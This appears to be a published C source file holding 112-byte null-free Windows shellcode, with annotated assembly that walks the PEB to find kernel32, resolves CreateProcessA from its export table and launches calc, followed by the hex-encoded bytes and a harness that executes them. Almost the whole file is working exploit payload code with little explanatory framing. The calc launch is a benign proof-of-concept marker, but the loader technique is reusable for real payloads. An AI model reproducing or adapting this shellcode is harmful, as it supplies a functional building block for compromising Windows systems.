///*
//
//;------------------------------------------------------------------------
//;Title...................All Windows Null-free CreateProcessA Calc
//;........................Shellcode 112 Bytes
//;Release Date............7/5/2011
//;Tested On...............Windows 2000, Windows XP, Windows XP x64,
//;........................Windows Vista, Windows 7, Windows 8 M3 x64
//;------------------------------------------------------------------------
//;Author..................John Leitch
//;Site....................http://www.autosectools.com/
//;Email...................john@autosectools.com
//;------------------------------------------------------------------------
//
//bits 32
//
//xor ebx, ebx
//
//;================================
//;Find Kernel32 Base
//;================================
//mov edi, [fs:ebx+0x30]
//mov edi, [edi+0x0c]
//mov edi, [edi+0x1c]
//
//module_loop:
//mov eax, [edi+0x08]
//mov esi, [edi+0x20]
//mov edi, [edi]
//cmp byte [esi+12], '3'
//jne module_loop
//
//;================================
//;Kernel32 PE Header
//;================================
//mov edi, eax
//add edi, [eax+0x3c]
//
//;================================
//; Export directory table
//;================================
//;0x00 Export Flags
//;0x04 Time/Date Stamp
//;0x08 Major Version
//;0x0A Minor Version
//;0x0C Name RVA
//;0x10 Ordinal Base
//;0x14 Address Table Entries
//;0x18 Number Of Names
//;0x1c Address Table RVA
//;0x20 Name Pointer Table RVA
//;0x24 Ordinal Table RVA
//;================================
//
//;================================
//;Kernel32 Export Directory Table
//;================================
//mov edx, [edi+0x78]
//add edx, eax
//
//;================================
//;Kernel32 Name Pointers
//;================================
//mov edi, [edx+0x20]
//add edi, eax
//
//;================================
//;Find CreateProcessA
//;================================
//mov ebp, ebx
//name_loop:
//mov esi, [edi+ebp*4]
//add esi, eax
//inc ebp
//cmp dword [esi],   0x61657243 ;Crea
//jne name_loop
//cmp dword [esi+8], 0x7365636f ;oces
//jne name_loop
//
//;================================
//;CreateProcessA Ordinal
//;================================
//mov edi, [edx+0x24]
//add edi, eax
//mov bp, [edi+ebp*2]
//
//;================================
//;CreateProcessA Address
//;================================
//mov edi, [edx+0x1C]
//add edi, eax
//mov edi, [edi+(ebp-1)*4] ;subtract ordinal base
//add edi, eax
//
//;================================
//;Zero Memory
//;================================
//mov ecx, ebx
//mov cl, 0xFF
//zero_loop:
//push ebx
//loop zero_loop
//
//push 0x636c6163 ;calc
//mov edx, esp
//
//;================================
//;Call CreateProcessA
//;================================
//push edx ;__out        LPPROCESS_INFORMATION lpProcessInformation
//push edx ;__in         LPSTARTUPINFO lpStartupInfo,
//push ebx ;__in_opt     LPCTSTR lpCurrentDirectory,
//push ebx ;__in_opt     LPVOID lpEnvironment,
//push ebx ;__in         DWORD dwCreationFlags,
//push ebx ;__in         BOOL bInheritHandles,
//push ebx ;__in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
//push ebx ;__in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
//push edx ;__inout_opt  LPTSTR lpCommandLine,
//push ebx ;__in_opt     LPCTSTR lpApplicationName,
//call edi
//
//*/
//
//#include <stdio.h>
//#include <windows.h>
//
//int main()
//{
//	//unsigned char* shellcode =
//	//	"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
//	//	"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
//	//	"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
//	//	"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
//	//	"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
//	//	"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
//	//	"\x45\x81\x3e\x43\x72\x65\x61\x75"
//	//	"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
//	//	"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
//	//	"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
//	//	"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
//	//	"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
//	//	"\x6c\x63\x89\xe2\x52\x52\x53\x53"
//	//	"\x53\x53\x53\x53\x52\x53\xff\xd7";
//
//	unsigned char* shellcode =
//		"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"
//		;
//		
//	printf("shellcode length: %i", strlen(shellcode));
//
//	/*LPVOID lpAlloc = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//	memcpy(lpAlloc, shellcode, strlen(shellcode));
//
//	((void(*)())lpAlloc)();*/
//
//	((void(*)())shellcode)();
//
//	return 0;
//}
